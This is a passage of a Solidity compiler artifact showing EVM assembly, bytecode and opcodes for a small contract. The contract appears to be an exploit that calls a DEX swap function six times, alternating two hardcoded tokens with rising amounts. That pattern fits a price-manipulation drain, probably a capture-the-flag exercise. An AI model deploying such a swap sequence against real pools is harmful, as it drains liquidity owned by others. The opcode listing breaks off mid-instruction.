\"#utility.yul\":3042:3060   */\n      add\n        /* \"#utility.yul\":3034:3060   */\n      swap1\n      pop\n        /* \"#utility.yul\":3070:3141   */\n      tag_119\n        /* \"#utility.yul\":3138:3139   */\n      0x00\n        /* \"#utility.yul\":3127:3136   */\n      dup4\n        /* \"#utility.yul\":3123:3140   */\n      add\n        /* \"#utility.yul\":3114:3120   */\n      dup7\n        /* \"#utility.yul\":3070:3141   */\n      tag_53\n      jump\t// in\n    tag_119:\n        /* \"#utility.yul\":3151:3223   */\n      tag_120\n        /* \"#utility.yul\":3219:3221   */\n      0x20\n        /* \"#utility.yul\":3208:3217   */\n      dup4\n        /* \"#utility.yul\":3204:3222   */\n      add\n        /* \"#utility.yul\":3195:3201   */\n      dup6\n        /* \"#utility.yul\":3151:3223   */\n      tag_53\n      jump\t// in\n    tag_120:\n        /* \"#utility.yul\":3233:3314   */\n      tag_121\n        /* \"#utility.yul\":3310:3312   */\n      0x40\n        /* \"#utility.yul\":3299:3308   */\n      dup4\n        /* \"#utility.yul\":3295:3313   */\n      add\n        /* \"#utility.yul\":3286:3292   */\n      dup5\n        /* \"#utility.yul\":3233:3314   */\n      tag_65\n      jump\t// in\n    tag_121:\n        /* \"#utility.yul\":2861:3321   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3327:3413   */\n    tag_66:\n        /* \"#utility.yul\":3373:3380   */\n      0x00\n        /* \"#utility.yul\":3402:3407   */\n      dup2\n        /* \"#utility.yul\":3391:3407   */\n      swap1\n      pop\n        /* \"#utility.yul\":3327:3413   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3419:3579   */\n    tag_67:\n        /* \"#utility.yul\":3478:3487   */\n      0x00\n        /* \"#utility.yul\":3511:3573   */\n      tag_124\n        /* \"#utility.yul\":3529:3572   */\n      tag_125\n        /* \"#utility.yul\":3538:3571   */\n      tag_126\n        /* \"#utility.yul\":3565:3570   */\n      dup5\n        /* \"#utility.yul\":3538:3571   */\n      tag_66\n      jump\t// in\n    tag_126:\n        /* \"#utility.yul\":3529:3572   */\n      tag_54\n      jump\t// in\n    tag_125:\n        /* \"#utility.yul\":3511:3573   */\n      tag_60\n      jump\t// in\n    tag_124:\n        /* \"#utility.yul\":3498:3573   */\n      swap1\n      pop\n        /* \"#utility.yul\":3419:3579   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3585:3734   */\n    tag_68:\n        /* \"#utility.yul\":3681:3727   */\n      tag_128\n        /* \"#utility.yul\":3721:3726   */\n      dup2\n        /* \"#utility.yul\":3681:3727   */\n      tag_67\n      jump\t// in\n    tag_128:\n        /* \"#utility.yul\":3676:3679   */\n      dup3\n        /* \"#utility.yul\":3669:3728   */\n      mstore\n        /* \"#utility.yul\":3585:3734   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":3740:4200   */\n    tag_32:\n        /* \"#utility.yul\":3898:3902   */\n      0x00\n        /* \"#utility.yul\":3936:3938   */\n      0x60\n        /* \"#utility.yul\":3925:3934   */\n      dup3\n        /* \"#utility.yul\":3921:3939   */\n      add\n        /* \"#utility.yul\":3913:3939   */\n      swap1\n      pop\n        /* \"#utility.yul\":3949:4020   */\n      tag_130\n        /* \"#utility.yul\":4017:4018   */\n      0x00\n        /* \"#utility.yul\":4006:4015   */\n      dup4\n        /* \"#utility.yul\":4002:4019   */\n      add\n        /* \"#utility.yul\":3993:3999   */\n      dup7\n        /* \"#utility.yul\":3949:4020   */\n      tag_53\n      jump\t// in\n    tag_130:\n        /* \"#utility.yul\":4030:4102   */\n      tag_131\n        /* \"#utility.yul\":4098:4100   */\n      0x20\n        /* \"#utility.yul\":4087:4096   */\n      dup4\n        /* \"#utility.yul\":4083:4101   */\n      add\n        /* \"#utility.yul\":4074:4080   */\n      dup6\n        /* \"#utility.yul\":4030:4102   */\n      tag_53\n      jump\t// in\n    tag_131:\n        /* \"#utility.yul\":4112:4193   */\n      tag_132\n        /* \"#utility.yul\":4189:4191   */\n      0x40\n        /* \"#utility.yul\":4178:4187   */\n      dup4\n        /* \"#utility.yul\":4174:4192   */\n      add\n        /* \"#utility.yul\":4165:4171   */\n      dup5\n        /* \"#utility.yul\":4112:4193   */\n      tag_68\n      jump\t// in\n    tag_132:\n        /* \"#utility.yul\":3740:4200   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4206:4292   */\n    tag_69:\n        /* \"#utility.yul\":4252:4259   */\n      0x00\n        /* \"#utility.yul\":4281:4286   */\n      dup2\n        /* \"#utility.yul\":4270:4286   */\n      swap1\n      pop\n        /* \"#utility.yul\":4206:4292   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4298:4458   */\n    tag_70:\n        /* \"#utility.yul\":4357:4366   */\n      0x00\n        /* \"#utility.yul\":4390:4452   */\n      tag_135\n        /* \"#utility.yul\":4408:4451   */\n      tag_136\n        /* \"#utility.yul\":4417:4450   */\n      tag_137\n        /* \"#utility.yul\":4444:4449   */\n      dup5\n        /* \"#utility.yul\":4417:4450   */\n      tag_69\n      jump\t// in\n    tag_137:\n        /* \"#utility.yul\":4408:4451   */\n      tag_54\n      jump\t// in\n    tag_136:\n        /* \"#utility.yul\":4390:4452   */\n      tag_60\n      jump\t// in\n    tag_135:\n        /* \"#utility.yul\":4377:4452   */\n      swap1\n      pop\n        /* \"#utility.yul\":4298:4458   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4464:4613   */\n    tag_71:\n        /* \"#utility.yul\":4560:4606   */\n      tag_139\n        /* \"#utility.yul\":4600:4605   */\n      dup2\n        /* \"#utility.yul\":4560:4606   */\n      tag_70\n      jump\t// in\n    tag_139:\n        /* \"#utility.yul\":4555:4558   */\n      dup3\n        /* \"#utility.yul\":4548:4607   */\n      mstore\n        /* \"#utility.yul\":4464:4613   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":4619:5079   */\n    tag_37:\n        /* \"#utility.yul\":4777:4781   */\n      0x00\n        /* \"#utility.yul\":4815:4817   */\n      0x60\n        /* \"#utility.yul\":4804:4813   */\n      dup3\n        /* \"#utility.yul\":4800:4818   */\n      add\n        /* \"#utility.yul\":4792:4818   */\n      swap1\n      pop\n        /* \"#utility.yul\":4828:4899   */\n      tag_141\n        /* \"#utility.yul\":4896:4897   */\n      0x00\n        /* \"#utility.yul\":4885:4894   */\n      dup4\n        /* \"#utility.yul\":4881:4898   */\n      add\n        /* \"#utility.yul\":4872:4878   */\n      dup7\n        /* \"#utility.yul\":4828:4899   */\n      tag_53\n      jump\t// in\n    tag_141:\n        /* \"#utility.yul\":4909:4981   */\n      tag_142\n        /* \"#utility.yul\":4977:4979   */\n      0x20\n        /* \"#utility.yul\":4966:4975   */\n      dup4\n        /* \"#utility.yul\":4962:4980   */\n      add\n        /* \"#utility.yul\":4953:4959   */\n      dup6\n        /* \"#utility.yul\":4909:4981   */\n      tag_53\n      jump\t// in\n    tag_142:\n        /* \"#utility.yul\":4991:5072   */\n      tag_143\n        /* \"#utility.yul\":5068:5070   */\n      0x40\n        /* \"#utility.yul\":5057:5066   */\n      dup4\n        /* \"#utility.yul\":5053:5071   */\n      add\n        /* \"#utility.yul\":5044:5050   */\n      dup5\n        /* \"#utility.yul\":4991:5072   */\n      tag_71\n      jump\t// in\n    tag_143:\n        /* \"#utility.yul\":4619:5079   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5085:5171   */\n    tag_72:\n        /* \"#utility.yul\":5131:5138   */\n      0x00\n        /* \"#utility.yul\":5160:5165   */\n      dup2\n        /* \"#utility.yul\":5149:5165   */\n      swap1\n      pop\n        /* \"#utility.yul\":5085:5171   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5177:5337   */\n    tag_73:\n        /* \"#utility.yul\":5236:5245   */\n      0x00\n        /* \"#utility.yul\":5269:5331   */\n      tag_146\n        /* \"#utility.yul\":5287:5330   */\n      tag_147\n        /* \"#utility.yul\":5296:5329   */\n      tag_148\n        /* \"#utility.yul\":5323:5328   */\n      dup5\n        /* \"#utility.yul\":5296:5329   */\n      tag_72\n      jump\t// in\n    tag_148:\n        /* \"#utility.yul\":5287:5330   */\n      tag_54\n      jump\t// in\n    tag_147:\n        /* \"#utility.yul\":5269:5331   */\n      tag_60\n      jump\t// in\n    tag_146:\n        /* \"#utility.yul\":5256:5331   */\n      swap1\n      pop\n        /* \"#utility.yul\":5177:5337   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5343:5492   */\n    tag_74:\n        /* \"#utility.yul\":5439:5485   */\n      tag_150\n        /* \"#utility.yul\":5479:5484   */\n      dup2\n        /* \"#utility.yul\":5439:5485   */\n      tag_73\n      jump\t// in\n    tag_150:\n        /* \"#utility.yul\":5434:5437   */\n      dup3\n        /* \"#utility.yul\":5427:5486   */\n      mstore\n        /* \"#utility.yul\":5343:5492   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5498:5958   */\n    tag_42:\n        /* \"#utility.yul\":5656:5660   */\n      0x00\n        /* \"#utility.yul\":5694:5696   */\n      0x60\n        /* \"#utility.yul\":5683:5692   */\n      dup3\n        /* \"#utility.yul\":5679:5697   */\n      add\n        /* \"#utility.yul\":5671:5697   */\n      swap1\n      pop\n        /* \"#utility.yul\":5707:5778   */\n      tag_152\n        /* \"#utility.yul\":5775:5776   */\n      0x00\n        /* \"#utility.yul\":5764:5773   */\n      dup4\n        /* \"#utility.yul\":5760:5777   */\n      add\n        /* \"#utility.yul\":5751:5757   */\n      dup7\n        /* \"#utility.yul\":5707:5778   */\n      tag_53\n      jump\t// in\n    tag_152:\n        /* \"#utility.yul\":5788:5860   */\n      tag_153\n        /* \"#utility.yul\":5856:5858   */\n      0x20\n        /* \"#utility.yul\":5845:5854   */\n      dup4\n        /* \"#utility.yul\":5841:5859   */\n      add\n        /* \"#utility.yul\":5832:5838   */\n      dup6\n        /* \"#utility.yul\":5788:5860   */\n      tag_53\n      jump\t// in\n    tag_153:\n        /* \"#utility.yul\":5870:5951   */\n      tag_154\n        /* \"#utility.yul\":5947:5949   */\n      0x40\n        /* \"#utility.yul\":5936:5945   */\n      dup4\n        /* \"#utility.yul\":5932:5950   */\n      add\n        /* \"#utility.yul\":5923:5929   */\n      dup5\n        /* \"#utility.yul\":5870:5951   */\n      tag_74\n      jump\t// in\n    tag_154:\n        /* \"#utility.yul\":5498:5958   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":5964:6050   */\n    tag_75:\n        /* \"#utility.yul\":6010:6017   */\n      0x00\n        /* \"#utility.yul\":6039:6044   */\n      dup2\n        /* \"#utility.yul\":6028:6044   */\n      swap1\n      pop\n        /* \"#utility.yul\":5964:6050   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6056:6216   */\n    tag_76:\n        /* \"#utility.yul\":6115:6124   */\n      0x00\n        /* \"#utility.yul\":6148:6210   */\n      tag_157\n        /* \"#utility.yul\":6166:6209   */\n      tag_158\n        /* \"#utility.yul\":6175:6208   */\n      tag_159\n        /* \"#utility.yul\":6202:6207   */\n      dup5\n        /* \"#utility.yul\":6175:6208   */\n      tag_75\n      jump\t// in\n    tag_159:\n        /* \"#utility.yul\":6166:6209   */\n      tag_54\n      jump\t// in\n    tag_158:\n        /* \"#utility.yul\":6148:6210   */\n      tag_60\n      jump\t// in\n    tag_157:\n        /* \"#utility.yul\":6135:6210   */\n      swap1\n      pop\n        /* \"#utility.yul\":6056:6216   */\n      swap2\n      swap1\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6222:6371   */\n    tag_77:\n        /* \"#utility.yul\":6318:6364   */\n      tag_161\n        /* \"#utility.yul\":6358:6363   */\n      dup2\n        /* \"#utility.yul\":6318:6364   */\n      tag_76\n      jump\t// in\n    tag_161:\n        /* \"#utility.yul\":6313:6316   */\n      dup3\n        /* \"#utility.yul\":6306:6365   */\n      mstore\n        /* \"#utility.yul\":6222:6371   */\n      pop\n      pop\n      jump\t// out\n        /* \"#utility.yul\":6377:6837   */\n    tag_47:\n        /* \"#utility.yul\":6535:6539   */\n      0x00\n        /* \"#utility.yul\":6573:6575   */\n      0x60\n        /* \"#utility.yul\":6562:6571   */\n      dup3\n        /* \"#utility.yul\":6558:6576   */\n      add\n        /* \"#utility.yul\":6550:6576   */\n      swap1\n      pop\n        /* \"#utility.yul\":6586:6657   */\n      tag_163\n        /* \"#utility.yul\":6654:6655   */\n      0x00\n        /* \"#utility.yul\":6643:6652   */\n      dup4\n        /* \"#utility.yul\":6639:6656   */\n      add\n        /* \"#utility.yul\":6630:6636   */\n      dup7\n        /* \"#utility.yul\":6586:6657   */\n      tag_53\n      jump\t// in\n    tag_163:\n        /* \"#utility.yul\":6667:6739   */\n      tag_164\n        /* \"#utility.yul\":6735:6737   */\n      0x20\n        /* \"#utility.yul\":6724:6733   */\n      dup4\n        /* \"#utility.yul\":6720:6738   */\n      add\n        /* \"#utility.yul\":6711:6717   */\n      dup6\n        /* \"#utility.yul\":6667:6739   */\n      tag_53\n      jump\t// in\n    tag_164:\n        /* \"#utility.yul\":6749:6830   */\n      tag_165\n        /* \"#utility.yul\":6826:6828   */\n      0x40\n        /* \"#utility.yul\":6815:6824   */\n      dup4\n        /* \"#utility.yul\":6811:6829   */\n      add\n        /* \"#utility.yul\":6802:6808   */\n      dup5\n        /* \"#utility.yul\":6749:6830   */\n      tag_77\n      jump\t// in\n    tag_165:\n        /* \"#utility.yul\":6377:6837   */\n      swap5\n      swap4\n      pop\n      pop\n      pop\n      pop\n      jump\t// out\n\n    auxdata: 0xa2646970667358221220b31c6253a27c0051bb198336b874e8ec5d6cd1a0bf2b23468be65e1ea3b71b0164736f6c63430008140033\n}\n",
				"bytecode": {
					"linkReferences": {},
					"object": "608060405234801561000f575f80fd5b50604051610b3b380380610b3b8339818101604052810190610031919061017b565b805f806101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550727ac777eabbefc9806c6ce859dea6c5837e32ed60015f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff16021790555073fc2f0a3fcf8c303ca895f46d337299d09f2fc01b60025f6101000a81548173ffffffffffffffffffffffffffffffffffffffff021916908373ffffffffffffffffffffffffffffffffffffffff160217905550506101a6565b5f80fd5b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f61014a82610121565b9050919050565b61015a81610140565b8114610164575f80fd5b50565b5f8151905061017581610151565b92915050565b5f602082840312156101905761018f61011d565b5b5f61019d84828501610167565b91505092915050565b610988806101b35f395ff3fe608060405234801561000f575f80fd5b506004361061004a575f3560e01c806325be124e1461004e578063422490ee1461006c578063692058c214610076578063d21220a714610094575b5f80fd5b6100566100b2565b6040516100639190610628565b60405180910390f35b6100746100d7565b005b61007e6105a1565b60405161008b919061069c565b60405180910390f35b61009c6105c4565b6040516100a99190610628565b60405180910390f35b60025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e5060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16600a6040518463ffffffff1660e01b8152600401610176939291906106f7565b5f604051808303815f87803b15801561018d575f80fd5b505af115801561019f573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e5060025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660146040518463ffffffff1660e01b815260040161024293929190610765565b5f604051808303815f87803b158015610259575f80fd5b505af115801561026b573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e5060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660186040518463ffffffff1660e01b815260040161030e939291906107d3565b5f604051808303815f87803b158015610325575f80fd5b505af1158015610337573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e5060025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16601e6040518463ffffffff1660e01b81526004016103da93929190610841565b5f604051808303815f87803b1580156103f1575f80fd5b505af1158015610403573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e5060015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660296040518463ffffffff1660e01b81526004016104a6939291906108af565b5f604051808303815f87803b1580156104bd575f80fd5b505af11580156104cf573d5f803e3d5ffd5b505050505f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1673ffffffffffffffffffffffffffffffffffffffff1663df791e5060025f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1660015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff16602d6040518463ffffffff1660e01b81526004016105729392919061091d565b5f604051808303815f87803b158015610589575f80fd5b505af115801561059b573d5f803e3d5ffd5b50505050565b5f8054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b60015f9054906101000a900473ffffffffffffffffffffffffffffffffffffffff1681565b5f73ffffffffffffffffffffffffffffffffffffffff82169050919050565b5f610612826105e9565b9050919050565b61062281610608565b82525050565b5f60208201905061063b5f830184610619565b92915050565b5f819050919050565b5f61066461065f61065a846105e9565b610641565b6105e9565b9050919050565b5f6106758261064a565b9050919050565b5f6106868261066b565b9050919050565b6106968161067c565b82525050565b5f6020820190506106af5f83018461068d565b92915050565b5f819050919050565b5f819050919050565b5f6106e16106dc6106d7846106b5565b610641565b6106be565b9050919050565b6106f1816106c7565b82525050565b5f60608201905061070a5f830186610619565b6107176020830185610619565b61072460408301846106e8565b949350505050565b5f819050919050565b5f61074f61074a6107458461072c565b610641565b6106be565b9050919050565b61075f81610735565b82525050565b5f6060820190506107785f830186610619565b6107856020830185610619565b6107926040830184610756565b949350505050565b5f819050919050565b5f6107bd6107b86107b38461079a565b610641565b6106be565b9050919050565b6107cd816107a3565b82525050565b5f6060820190506107e65f830186610619565b6107f36020830185610619565b61080060408301846107c4565b949350505050565b5f819050919050565b5f61082b61082661082184610808565b610641565b6106be565b9050919050565b61083b81610811565b82525050565b5f6060820190506108545f830186610619565b6108616020830185610619565b61086e6040830184610832565b949350505050565b5f819050919050565b5f61089961089461088f84610876565b610641565b6106be565b9050919050565b6108a98161087f565b82525050565b5f6060820190506108c25f830186610619565b6108cf6020830185610619565b6108dc60408301846108a0565b949350505050565b5f819050919050565b5f6109076109026108fd846108e4565b610641565b6106be565b9050919050565b610917816108ed565b82525050565b5f6060820190506109305f830186610619565b61093d6020830185610619565b61094a604083018461090e565b94935050505056fea2646970667358221220b31c6253a27c0051bb198336b874e8ec5d6cd1a0bf2b23468be65e1ea3b71b0164736f6c63430008140033",
					"opcodes": "PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x40 MLOAD PUSH2 0xB3B CODESIZE SUB DUP1 PUSH2 0xB3B DUP4 CODECOPY DUP2 DUP2 ADD PUSH1 0x40 MSTORE DUP2 ADD SWAP1 PUSH2 0x31 SWAP2 SWAP1 PUSH2 0x17B JUMP JUMPDEST DUP1 PUSH0 DUP1 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH19 0x7AC777EABBEFC9806C6CE859DEA6C5837E32ED PUSH1 0x1 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP PUSH20 0xFC2F0A3FCF8C303CA895F46D337299D09F2FC01B PUSH1 0x2 PUSH0 PUSH2 0x100 EXP DUP2 SLOAD DUP2 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF MUL NOT AND SWAP1 DUP4 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND MUL OR SWAP1 SSTORE POP POP PUSH2 0x1A6 JUMP JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH0 PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF DUP3 AND SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH0 PUSH2 0x14A DUP3 PUSH2 0x121 JUMP JUMPDEST SWAP1 POP SWAP2 SWAP1 POP JUMP JUMPDEST PUSH2 0x15A DUP2 PUSH2 0x140 JUMP JUMPDEST DUP2 EQ PUSH2 0x164 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP JUMP JUMPDEST PUSH0 DUP2 MLOAD SWAP1 POP PUSH2 0x175 DUP2 PUSH2 0x151 JUMP JUMPDEST SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH0 PUSH1 0x20 DUP3 DUP5 SUB SLT ISZERO PUSH2 0x190 JUMPI PUSH2 0x18F PUSH2 0x11D JUMP JUMPDEST JUMPDEST PUSH0 PUSH2 0x19D DUP5 DUP3 DUP6 ADD PUSH2 0x167 JUMP JUMPDEST SWAP2 POP POP SWAP3 SWAP2 POP POP JUMP JUMPDEST PUSH2 0x988 DUP1 PUSH2 0x1B3 PUSH0 CODECOPY PUSH0 RETURN INVALID PUSH1 0x80 PUSH1 0x40 MSTORE CALLVALUE DUP1 ISZERO PUSH2 0xF JUMPI PUSH0 DUP1 REVERT JUMPDEST POP PUSH1 0x4 CALLDATASIZE LT PUSH2 0x4A JUMPI PUSH0 CALLDATALOAD PUSH1 0xE0 SHR DUP1 PUSH4 0x25BE124E EQ PUSH2 0x4E JUMPI DUP1 PUSH4 0x422490EE EQ PUSH2 0x6C JUMPI DUP1 PUSH4 0x692058C2 EQ PUSH2 0x76 JUMPI DUP1 PUSH4 0xD21220A7 EQ PUSH2 0x94 JUMPI JUMPDEST PUSH0 DUP1 REVERT JUMPDEST PUSH2 0x56 PUSH2 0xB2 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x63 SWAP2 SWAP1 PUSH2 0x628 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x74 PUSH2 0xD7 JUMP JUMPDEST STOP JUMPDEST PUSH2 0x7E PUSH2 0x5A1 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0x8B SWAP2 SWAP1 PUSH2 0x69C JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH2 0x9C PUSH2 0x5C4 JUMP JUMPDEST PUSH1 0x40 MLOAD PUSH2 0xA9 SWAP2 SWAP1 PUSH2 0x628 JUMP JUMPDEST PUSH1 0x40 MLOAD DUP1 SWAP2 SUB SWAP1 RETURN JUMPDEST PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND DUP2 JUMP JUMPDEST PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0xA PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x176 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x6F7 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x18D JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x19F JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x14 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x242 SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x765 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x259 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x26B JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x18 PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x30E SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x7D3 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO PUSH2 0x325 JUMPI PUSH0 DUP1 REVERT JUMPDEST POP GAS CALL ISZERO DUP1 ISZERO PUSH2 0x337 JUMPI RETURNDATASIZE PUSH0 DUP1 RETURNDATACOPY RETURNDATASIZE PUSH0 REVERT JUMPDEST POP POP POP POP PUSH0 DUP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH4 0xDF791E50 PUSH1 0x2 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1 PUSH0 SWAP1 SLOAD SWAP1 PUSH2 0x100 EXP SWAP1 DIV PUSH20 0xFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFFF AND PUSH1 0x1E PUSH1 0x40 MLOAD DUP5 PUSH4 0xFFFFFFFF AND PUSH1 0xE0 SHL DUP2 MSTORE PUSH1 0x4 ADD PUSH2 0x3DA SWAP4 SWAP3 SWAP2 SWAP1 PUSH2 0x841 JUMP JUMPDEST PUSH0 PUSH1 0x40 MLOAD DUP1 DUP4 SUB DUP2 PUSH0 DUP8 DUP1 EXTCODESIZE ISZERO DUP1 ISZERO 